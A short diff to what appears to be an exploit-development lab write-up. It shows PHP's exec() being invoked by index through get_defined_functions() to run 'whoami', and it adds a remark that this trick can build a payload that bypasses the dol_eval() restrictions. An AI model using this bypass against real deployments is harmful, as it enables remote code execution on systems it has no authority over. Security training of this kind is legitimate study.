@@ -272,3 +272,5 @@ Let's verify we can invoke `exec()` this way and run `whoami`.
 php > echo get_defined_functions()["internal"][550]("whoami");
 student
 ```
+Excellent. We can invoke `exec()` without specifying the function name directly. We can build a payload using this approach to bypass the restrictions in the `dol_eval()` function.
+
